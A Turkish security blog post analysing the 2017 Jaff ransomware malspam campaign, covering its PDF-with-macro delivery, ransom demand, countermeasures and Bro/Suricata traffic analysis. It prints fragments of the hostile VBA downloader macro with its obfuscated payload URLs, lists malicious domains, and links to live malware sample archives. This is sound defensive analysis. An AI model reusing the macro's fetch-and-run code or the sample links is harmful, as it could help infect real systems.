---
layout: post
title: Jaff Ransomware Saldırı Analizi
categories: zararli-yazilim some
---



![2017-05-22-jaff-malspam-image-04.jpg](/../post_images/2017-06-20-jaff-ransomware/mermaid.jpg)
(Deniz kızları, belinden yukarısı dişi bir insan görünümünde olan, ama aynı zamanda bir balık kuyruğuna sahip olan efsaneleşmiş düşsel inanışlardır.)

**Aşağıdaki dosyalar zararlı yazılım içermektedir. Tüm dosyaları sanal makine üzerinde çalıştırmanızı tavsiye ederiz, bu konuyla ilgili tüm sorumluluk kullanıcıya aittir.**

Zararlıya ait PCAP dosyası : [ 2017-05-22-Jaff-ransomware-malspam-traffic.pcap.zip](http://www.malware-traffic-analysis.net/2017/05/22/2017-05-22-Jaff-ransomware-malspam-traffic.pcap.zip) (Zip parolası : infected)

Tüm zararlı dosyaları içeren zip arşivi : [ 2017-05-22-Jaff-ransomware-emails-and-artifacts.zip](http://www.malware-traffic-analysis.net/2017/05/22/2017-05-22-Jaff-ransomware-emails-and-artifacts.zip) (Zip parolası : infected)

* TOC
{:toc}

## Jaff Ransomware Zararlı Yazılımı:

Ransomware dalgaları her hafta yeni türevleri ile tüm dünyada hızla büyümektedir. Bu yazımızda yeni ramsonware  olan "Jaff" inceleceğiz. Jaff ramsonware kampanyası birçok fidye yazılımı gibi spam e-mail içerisinde pdf eklentisi ile yayılmaya başlamıştır. Jaff zararlısının bir önemli noktası ise "**Necurs**" botnetini kullanmasıdır. Bu yayılma şekli daha önce incelediğimiz dridex zararlısı ve locky zararlısı ile benzerdir.

## Yayılma Şekli

![2017-05-22-jaff-malspam-image-04.jpg](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-04.png)

Spam e-mail içerisindeki pdf eklentiye gömülü word dokümanı içerisinde zararlı makro bulunmaktadır. Kullanıcı pdf dosyayı açtığı zaman gömülü word dokumanının da açılabilmedi için izin ister. Kullanıcının izin vermesi durumunda zararlı makro çalışmaya başlar. Bu durumda "jaff ransomware" bulunduğu bilgisayar içerisinde dosyaları ".jaff" uzantısına sahip olacak şekilde şifreler.

## Saldırı Analizi

Kullanıcılara pdf eklentisi içereren bir spam mail gönderilir. Aşağıdaki örnek mail içerisinde müşteri hizmetlerinden fatura geliyormuş gibi gösterilen jaff ransomware içeren bir maildir.
![2017-05-22-jaff-malspam-image-01.jpg](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-01.jpg)

Kullanıcının mail eklentisi içerisindeki pdf dosyasını açmak istemesi ile pdf haline getirilmiş Word dosyasının açılması için kullanıcıdan izin ister.

![2017-05-22-jaff-malspam-image-02.jpg](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-02.jpg)

Word dosyası içeriği Microsoft word tarafından devre dışı bırakılarak dosya içeriği görüntülenemez ve zararlı makro çalışmamıştır. Ama kullanıcının içeriği görüntülemesi için ofis öneri olarak kullanıcıya makroyu etkinteştirilmesini göstermektedir. Bilinçsiz kullanıcılar mail içerisinde fatura bilgisi olduğunu düşünerek dosyayı ısrarla açmak istemesi durumunda zararlı makro etkinleşerek command and control sunucusuna bağlanarak **Jaff payload**'ını içeren domainlerden fidye yazılımını bilgisayara indirerek kullanıcının bilgisayarında komut satırını kullanarak çalıştırır.

![2017-05-22-jaff-malspam-image-03.jpg](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-03.jpg)

Jaff aktifleştiğinde masaüstü duvar kağıdını kullanıcının görebileceği şekilde değiştirir.
![2017-05-22-jaff-malspam-image-07.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-07.png)

Ayrıca kullanıcının okuması için "readme.txt" dosyasıda bulunmaktadır.

![2017-05-22-jaff-malspam-image-08.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-08.png)

Jaff ransomware sistem içerisinde aşağıdaki uzantılara sahip dosyaları arar. Bu uzantılardan birine sahip dosya bulunması durumunda malware dosyayı şifreleyerek uzantısını ".jaff" yapar.

``
.xlsx, .acd, .pdf, .pfx, .crt, .der, .cad, .dwg, .MPEG, .rar, .veg, .zip, .txt, .jpg, .doc, .wbk, .mdb, .vcf, .docx, .ics, .vsc, .mdf, .dsr, .mdi, .msg, .xls, .ppt, .pps, .obd, .mpd, .dot, .xlt, .pot, .obt, .htm, .html, .mix, .pub, .vsd, .png, .ico, .rtf, .odt, .3dm, .3ds, .dxf, .max, .obj, .7z, .cbr, .deb, .gz, .rpm, .sitx, .tar, .tar.gz, .zipx, .aif, .iff, .m3u, .m4a, .mid, .key, .vib, .stl, .psd, .ova, .xmod, .wda, .prn, .zpf, .swm, .xml, .xlsm, .par, .tib, .waw, .001, .002, 003., .004, .005, .006, .007, .008, .009, .010, .contact, .dbx, .jnt, .mapimail, .oab, .ods, .ppsm, .pptm, .prf, .pst, .wab, .1cd, .3g2, .7ZIP, .accdb, .aoi, .asf, .asp., aspx, .asx, .avi, .bak, .cer, .cfg, .class, .config, .css, .csv, .db, .dds, .fif, .flv, .idx, .js, .kwm, .laccdb, .idf, .lit, .mbx, .md, .mlb, .mov, .mp3, .mp4, .mpg, .pages, .php, .pwm, .rm, .safe, .sav, .save, .sql, .srt, .swf, .thm, .vob, .wav, .wma, .wmv, .xlsb, .aac, .ai, .arw, .c, .cdr, .cls, .cpi, .cpp, .cs, .db3, .docm, .dotm, .dotx, .drw, .dxb, .eps, .fla, .flac, .fxg, .java, .m, .m4v, .pcd, .pct, .pl, .potm, .potx, .ppam, .ppsx, .ps, .pspimage, .r3d, .rw2, .sldm, .sldx, .svg, .tga, .wps, .xla, .xlam, .xlm, .xltm, .xltx, .xlw, .act, .adp, .al, .bkp, .blend, .cdf, .cdx, .cgm, .cr2, .dac, .dbf, .dcr, .ddd, .design, .dtd, .fdb, .fff, .fpx, .h, .iif, .indd, .jpeg, .mos, .nd, .nsd, .nsf, .nsg, .nsh, .odc, .odp, .oil, .pas, .pat, .pef, .ptx, .qbb, .qbm, .sas7bdat, .say, .st4, .st6, .stc, .sxc, .sxw, .tlg, .wad, .xlk, .aiff, .bin, .bmp, .cmt, .dat, .dit, .edb, .flvv, .gif, .groups, .hdd, .hpp, .log, .m2ts, .m4p, .mkv, .ndf, .nvram, .ogg, .ost, .pab, .pdb, .pif, .qed, .qcow, .qcow2, .rvt, .st7, .stm, .vbox, .vdi, .vhd, .vhdx, .vmdk, .vmsd, .vmx, .vmxf, .3fr, .3pr, .ab4, .accde, .accdt, .ach, .acr, .adb, .srw, .st5, .st8, .std, .sti, .stw, .stx, .sxd, .sxg, .sxi, .sxm, .tex, .wallet, .wb2, .wp, .x11, .x3f, .xis, .ycbcra, .qbw, .qbx, .qby, .raf, .rat, .raw, .rdb, rwl, .rwz, .s3db, .sd0, .sda, .sdf, .sqlite, .sqlite3, .sqlitedb, .sr, .srf, .oth, .otp, .ots, .ott, .p12, .p7b, .p7c, .pdd, .pem, .plus_muhd, .plc, .pptx, .psafe3, .py, .qba, .qbr.myd, .ndd, .nef, .nk, .nop, .nrw, .ns2, .ns3, .ns4, .nwb, .nx2, .nxl, .nyf, .odb, .odf, .odg, .odm, .ord, .otg, .ibz, .iiq, .incpas, .jpe, .kc2, .kdbx, .kdc, .kpdx, .lua, .mdc, .mef, .mfw, .mmw, .mny, .moneywell, .mrw.des, .dgc, .djvu, .dng, .drf, .dxg, .eml, .erbsql, .erd, .exf, .ffd, .fh, .fhd, .gray, .grey, .gry, .hbk, .ibank, .ibd, .cdr4, .cdr5, .cdr6, .cdrw, .ce1, .ce2, .cib, .craw, .crw, .csh, .csl, .db_journal, .dc2, .dcs, .ddoc, .ddrw, .ads, .agdl, .ait, .apj, .asm, .awg, .back, .backup, .backupdb, .bank, .bay, .bdb, .bgt, .bik, .bpw, .cdr3, .as4
``

Jaff ransomware readme.txt içerisindeki talimatlar incelendiğinde kullanıcıdan Tor tarayıcısını indirmesini istiyor. Tor tarayıcısını kullanarak şifrelenmiş dosyaların açılması için ödeme yapılacak web sayfası "http://rktazuzi7hbln7sy.onion/" giriş yapılmasını istiyor. Verilen adrese giriş yapıldığı zaman kullanıcıdan jaff tarafından etkilenen sisteme malware tarafından verilen ID'nin girilmesi bekleniliyor.

![2017-05-22-jaff-malspam-image-10.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-10.png)

Verilen ID'nin girilmesinden sonra site içerisinde saldırganın istediği bitcoin miktarı ve ödemenin nasıl yapılacağı talimatları adım adım veriliyor.Aşağıdaki örnekte istenilen 2.01117430 Bitcoin şu anda 5922,9 dolara denk gelmektedir.

![2017-05-22-jaff-malspam-image-09.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-09.png)

**ÖNEMLİ NOT**:
Jaff ransomware yada herhangi bir randomware saldırısı sonucunda etkilenen bir sistemde kullanıcılar olarak **saldırganlara kesinlikle ödeme yapmayınız!** Saldırganların yapılan ödeme sonucunda dosyalarınızı açacağı konusunda hiçbir garanti bulunmamaktadır. Ayrıca sisteminizin yeniden saldırıya maruz kalmayacağının da bir garantisi bulunmamaktadır.

## Jaff Ransomware Analizi:

“2017-05-22-Jaff-ransomware-emails-and-artifacts.zip” Arşiv dosyası içerisinde “embedded-Word-docs” dizini altında mail yolu ile kişilere gönderilen zararlı makro kodu içeren “docm” dosyaları bulunmaktadır. “Oledump” aracını kullanarak Microsoft Office dosyaları içerisinden makro kaynak kodunu inceleyebiliriz.

Oledump aracını “https://videos.didierstevens.com/2014/08/26/oledump-py-beta/” adresinden indirebilirsiniz. Oledump programına giriş olarak zararlı makro içeren “BMUC3LI.docm” dosyası verilerek çalıştırılır.

```
muge@secops:/SecOps-Blog/Oledump# python oledump.py ~/SecOps-Blog/2017-05-22-Jaff-ransomware-emails-and-artifacts/embedded-Word-docs/BMUC3LI.docm
A: word/vbaProject.bin
 A1:       733 'PROJECT'
 A2:       155 'PROJECTwm'
 A3: M    5013 'VBA/Module1'
 A4: M    2455 'VBA/Module2'
 A5: M   11718 'VBA/Module3'
 A6: M    1965 'VBA/STRIX'
 A7: M    1492 'VBA/ThisDocument'
 A8: m    1157 'VBA/Window1'
 A9:      6322 'VBA/_VBA_PROJECT'
A10:       950 'VBA/dir'
A11:        97 'Window1/\x01CompObj'
A12:       292 'Window1/\x03VBFrame'
A13:       599 'Window1/f'
A14:       584 'Window1/o'
```
Oledump çıktısı bize dokümanın yapısı hakkında bilgi verir. Çıktı içerisinde gözlemlenen M harfi bize burada makronun varlığını göstermektedir. Makro potansiyeli içeren satırları “python oledump.py -v -s A7 BMUC3LI.docm >> <çıktıdosyası>" komutunu çalıştırarak dışarı çıkartabiliriz. Macro yapısına sahip olan satırları teker teker inceleyerek scriptin çalışma yapısı incelenir. İlk olarak "ThisDocument" incelenmeye başlanır. 
ThisDocument içerisinde "**Sub autoopen()**" parametresi ilk dikkatimizi çeken parametredir. Bu parametre dokümanın açılması ile makronun çalışmasını sağlar. Zararlı hareketi olduğunu gösteren bir kanıttır. Ayrıca "**Synomati "x1620"**" değeri de dikkat çekmektedir.

```
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Sub autoopen()
Synomati "x1620"
End Sub
Sub Document_Open()
End Sub
```

"**Module1**" dosyasına bakıldığında göze ilk çarpan "**everstruct.cRRDD.au\jhg6fghVbrotexxshferrogd.net\af\jhg6fghVherrossoidffr6644qa.top\af\jhg6fghVelectua.org\jhg6fgh**" adresinden **jhg6fgh** isimli bir dosyanın indirildiğidir. Aşağıdaki kod içerisindeki adress incelendiğinde "everstruct.cRRDD.au" adresi içerisinde garip olan **RRDD** görüyoruz aslında kodu tam incelediğimizde **replace** komutu ile "RRDD" , "om" ile değiştirilerek everstruct.c**om**.au" adresini tamamlamaktadır.

```
ValdayE = Valday(2)
   Shtefin = Replace("everstruct.cRRDD.au\jhg6fghVbrotexxshferrogd.net\af\jhg6fghVherrossoidffr6644qa.top\af\jhg6fghVelectua.org\jhg6fgh", "RRDD", "om")
   Shtefin = Replace(Shtefin, "\", "/")
cnpk = Split(Shtefin, Window1.Command.Caption)
 Set SubProperty = CreateObject(Valday(1))
```
"Module1 içerisinde dikkat çeken bir başka kod ise "CreateObject" kullanarak indirilen jaff zararlısının template bir dizin içerisine indirildiği ve "objWMIService" ile jaff zararlısının çalıştırıldığı gözlemlenmektedir.
```
Public Function Uber_ProjectSpeed()
GoTo rTemp2
    Set FSO = CreateObject("Scripting.FileSystemObject")
Set oArgs = WScript.Arguments
If oArgs.Count = 1 Then
        strComputer = CStr(oArgs(0))
Else
    strComputer = InputBox("Enter computer name")
End If
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_VideoController", "WQL", _
wbemFlagReturnImmediately + wbemFlagForwardOnly)
rTemp2:
 Uber_Project = Uber_LAKOPPC
 Uber_ProjectBBB = Uber_Project + "\eewadro" + CStr(itemI)
GoTo rTemp3
```
"**Module2**" Dosyası incelendiğinde daha önce ThisDocument içerisinde gördüğümüz **Synomati** fonksiyonunu görüyoruz. Burada Windows 7 ve XP karşılantırması yapıldığını görüyoruz. Buraya göre ransomware 2 windows versiyonuna göre farklı işlemlerde bulunduğunu söyleyebiliriz.

```
Public Function Synomati(Comps)
    GoTo l12
    strComputer = Comps
    Set oWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    If InStr(1, strCaption, "Windows 7", vbTextCompare) Then
        Synomati = "Win7"
    End If
    If InStr(1, strCaption, "XP", vbTextCompare) Then
        Synomati = "XP"
    End If
l12:
    Dim c As STRIX
Set c = New STRIX
CallByName c, Window1.T2.Text, _
VbMethod
End Function
```

Zararlının bulunduğu embedded-Word-docs dizini içerisindeki diğer Microsoft ofis dökümanlarını incelediğimizde Jaff ransomware dalgasının kullandığı diğer web adresleri aşağıdadır.

   - brotexxs errogd.net
   - datadunyasi.com
   - dewatch.de
   - electua.org
   - essensworld.cz
   - everstruct.com.au
   - f1toh1.com
   - herrossoidffr6644qa.top
   - joesrv.com
   - knowyourmarketing.com
   - pattumalamatha.com
   - primary-ls.ru
   - tayan ood.com
   - tipogr ia.by
   - way2lab.com

Jaff ransomware spam mail saldırısının çeşitli dalgaları ve domain adreslerini kullandığını tespit edilmiştir. Jaff malspam dalgalarının tarihleri ve adresleri aşağıdadır.

| Jaff Ransomware Web Adresleri  |
|-------|:-------:|:-------:|:-------:|
| **2017-06-06 Jaff Dalgası**|**2017-05-25 Jaff Dalgası** | **2017-05-11 Jaff Dalgası** | **2017-05-16 Jaff Dalgası** |
|10minutesto1.net |  better57toiuydofnet |5hdnnd74dffrottd.com |herrossoidffr6644qa.top |
| cafe-bg.com     |blackstoneconsultants.com  |babil117.com |jsplast.ru |
| cor-huizer.nl     |derossigroup.it   | boaevents.com | juvadent.de     |
| essentialnulidtro.com/      | dianagaertner.com  | byydei74fg43 4f.net |opearl.net |
| lcpinternational.fr     | hunter.cz   |easysupport.us | playmindltd.com |
| luxurious-ss.com     |youtoolgrabeertorse.org | edluke.com |sjffonrvcik45bd.info |
| makh.ch         |**2017-05-22 Jaff Dalgası**|julian-g.ro     | tidytrend.com |
|myinti.com     |    datadunyasi.com   |phinamco.com|tomcarservice.it     |
| mymobimarketing.com   |brotexxshferrogd.net| takanashi.jp |titanmachinery.com.au  |
|oneby1.jp      | dewatch.de |techno-kar.ru |ventrust.ro |
| seoulhome.net   | electua.org |tending.info |wizbam.com |
| sextoygay.be    | essensworld.cz  |tiskr.com | vipan-photography.com     |
| squidincdirect.com.au|everstruct.com.au|trans-atm.com |**2017-05-15 Jaff Dalgası**|
|studyonazar.com   | f1toh1.com|trialinsider.com | sjffonrvcik45bd.info |
|supplementsandfitness.com  |  herrossoidffr6644qa.top |vscard.net |urachart.com    |
|zechsal.pl     | joesrv.com  |   |fotografikum.com   |
|**2017-05-24 Jaff Dalgası**|knowyourmarketing.com||5hdnnd74dffrottd.com  |
|better57toiuydof.net |pattumalamatha.com ||byydei74fg43ff4f.net |
|david-faber.de |primary-ls.ru|
| digital-helpdesk.com |tayangfood.com|
|dogplay.co.kr  |tipografia.by|
|ecoeventlogistics.com  |way2lab.com |
|elateplaza.com  |wipersdirect.com|
| minnessotaswordfishh.com |
|pcflame.com.au  |
| tdtuusula.com |
|uslugitransportowe-warszawa.pl |

**Host makineye indirilen Jaff Ransomware bilgileri:**
```
    SHA256 hash:  3105bf7916ab2e8bdf32f9a4f798c358b4d18da11bcc16f8f063c4b9c200f8b4
    File size:  184,320 bytes
    File location:  C:\Users\[username]\AppData\Local\Temp\buzinat8.exe
```


## Jaff Ransomware Karşı Önlemler

Ransomware saldırıları sistem yöneticilerin kabusu haline geldi. Ransomware tarafından etkilenen sistemlerde önemli bilgilerin kullanılamaz hala gelmesi şirketlerde büyük miktarda kayıplara sebep olmaktadır. Sistem yöneticileri olarak sistemlerimizi her türlü saldırıya hazır hale getirmeliyiz. Ransomware saldırılarına karşı alınabilecek temel önlemler vardır.

#### 1- Düzenli Backup
Ransomware saldırılarına karşı tek ve en önemi savunma düzenli olarak yedeklemesi alınan bir sistemdir. Günlük yedeklemelerde saldırı sonucunda bir gün öncesine yedekten dönüldüğünde sabahki dosyalar kaybolabilir ama ondan önceki tüm dosyalarınızı kurtarabilirsiniz. Yedekleme yapılan diskler ile ilgili önemli bir nokta çeşitli fidye yazılımları usb, network veya bulut içerisindeki dosyaları dahi şifreyebilmektedir. Bu sebeple yedekler, yedekleme olmadığı sürece bağlı olmayan harici diskler içerisine alınmalıdır.

#### 2- Yazılımların Güncellenmesi
Saldırganlar malware yazarken zafiyetleri bilinen güncellemesi yapılmamış yazılımları göz önünde bulundururlar.Sistemlerin güncel olması ransomware saldırısı potensiyelini azaltıcaktır. Güncellemeler için önemli nokta kullanılan yazılımın orjinal sitesinden güncellemeler yapılmalıdır.

#### 3- Güvenlik Yazılımlarının Kullanılması
Sistemleri korumak için tehditleri belirlemek veya şüpheli davranışları tespit etmek önemlidir. Bu gibi durumlar için anti-malware yazılımlar ve güvenlik duvarları kullanılmalıdır. Malware yazılımcıları sürekli yazılımlarını değiştirmektedir bunun için kullanılan güvenlik yazılımlarının sürekli kendini güncellemesine dikkat edilmelidir.

#### 4. Dosya uzantılarının Görüntülenmesi
Zararlı dosya uzantıları genellikle **".pdf.exe"** şeklinde görülür. Windows genellikle dosyaların uzantılarını gizlemektedir. Ayarlardan dosya türleri için uzantıları göstermeyi açarak şüpheli dosyaları görebilirsiniz. Tam dosya uzantısını görmek sizi erken davranmanızı sağlar.

#### 5. AppData/LocalAppData Dizinin İçerisinde Program Çalıştırılmasının Engellenmesi
Ransomware yazılımları etkilenen sistemleri içerisinde genellikle App Data veya Local App Data dizinleri içerisine yerleşerek çalışırlar. Windows üzerinde kural oluşturularak veya Intrusion Prevention yazılımları ile bu dizinler içerisinde program çalıştırılması engellenebilir.

## Trafik Analizi
Zararlı dosya aktifleştirildiği andan itibaren kaydedilen Pcap dosyasını SecurityOnion sistemini kullanarak BRO ile incelemeye başlıyoruz. Aşağıdaki komut kullanılarak pcap dosyası analizine başlanılır. Bro pcap içerisindeki trafiği kendi alanlarına bölerek log dosyalarına yazar.
```
mc@secops:~/JAFF/Trafik-Analizi$ bro -r 2017-05-22-Jaff-ransomware-malspam-traffic.pcap local
```
"conn.log" dosyası incelendiğinde zararlı PDF dosyasının "217.29.63.199" ve "27.123.25.1" IP adreslerine http üzerinden bağlandıklarını görmekteyiz.

![2017-05-22-jaff-malspam-image-13.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-13.png)

Zararlının bağlandıkları IP adreslerinin domainlerini tespit etmek için "dns.log" dosyası incelenebilir. Bu dosya içerisinde "27.123.25.1" IP adresinin "everstruct.com.au" domain ismine ve 217.29.63.199" IP adresinin de "trollitrancessions.net" domain ismine sahip olduğunu görüyoruz.
"http.log" dosyası da incelendiğinde "GET" isteklerinin gönderildiği domain ve IP adresleri tespit edilmektedir. **everstruct.com.au** adresini oledump kullanarak zararlı macroyu incelediğimizde de tespit etmiştik bu adres "jaff" zararlısının indirildiği zararlı bir adrestir. "**trollitrancessions.net**" adresine jaff zararlısının sisteme bulaşmasından sonra oluşan bir trafik olduğunu görüyoruz.
![2017-05-22-jaff-malspam-image-14.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-14.png)

### Saldırı Tespit Sistemi Kullanarak Trafik Analizi

Trafik analizi ve saldırı tespit sistemi ile zararlının sistemde tespiti için SELKS (Suricata/Elasticsearch/Logstash/Kibana/Scirius) sistemini kullanabiliriz. Pcap dosyasını SELKS içerisinde bulunan Suricata ile analiz edebiliriz.
Suricata içerisindeki kurallar sayesinde sistemde anormal bir network akışı olduğu zaman kurallar tarafından tespit edilerek alarm oluşturmaktadır. Bu alarmlar sayesinde sistem yöneticileri sistemlerindeki zararlıyı tespit edebilmektedir. "tcpreplay" komutu ile elimizdeki mail eklentisi içerisindeki pdf dökümanınında  macronun aktifleştirilmesinden jaff zararlısının sisteme indirilerek oluşturduğu network trafiğini SELKS sistemi içerisinde yeniden oynatarak suricata içerisindeki kuralların nasıl alarm oluşturduğunu gözlemleyeceğiz.
```
selks-user@SELKS:~/JAFF$ tcpreplay -i eth0 2017-05-22-Jaff-ransomware-malspam-traffic.pcap
```
SELKS içerisindeki evebox (web tabanlı suricata event viewer)sayesinde suricatanın oluşturduğu alarmlar ayrıntılı olarak incelenebilmektedir.
![2017-05-22-jaff-malspam-image-16.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-16.png)

Alarmlar incelendiğinde ilk oluşan alarmın " ET TROJAN MalDoc Retrieving Payload May 23 2017 2" olduğunu görüyoruz. Zararlı adrese olan bağlantı tespit edilmiştir.

![2017-05-22-jaff-malspam-image-17.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-17.png)

İkinci oluşan alarm "ET TROJAN Known Malicious Doc Downloading Payload Dec 06 2016 "içeriğini incelediğimizde isminden de anlaşıldığı gibi zararlı macroda gördüğümüz "everstruct.com.au" adresinden "jhg6fgh" zararlısının indirildiği tespit ediliyor.

![2017-05-22-jaff-malspam-image-18.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-18.png)

Son oluşan alarm "ET TROJAN Jaff Ransomware Checkin M1" ise sistemede jaff randomware sonrasında oluşan network trafiğidir.

![2017-05-22-jaff-malspam-image-19.png](/../post_images/2017-06-20-jaff-ransomware/2017-05-22-jaff-malspam-image-19.png)

## Son Notlar:
-------------------------------------------------------
Not: Bu yazıda kullanılan içerikler http://www.malware-traffic-analysis.net adresinden alınmış olup, yazarın kendisinden izin alınmış(@malware_traffic) ve düzenlenmiştir. Kendisine yardımları için teşekkür ederiz.

PS: All materials on this post are taken from http://www.malware-traffic-analysis.net. Special thanks to @malware_traffic for sharing.

## Referanslar
http://blog.emsisoft.com/2017/05/11/jaff-ransomware-the-new-locky/
http://blog.talosintelligence.com/2017/05/jaff-ransomware.html
https://www.welivesecurity.com/2013/12/12/11-things-you-can-do-to-protect-against-ransomware-including-cryptolocker/

- http://www.mookychick.co.uk/health/spirituality/mermaid-myths-britain-where-to-find-mermaids-uk.php




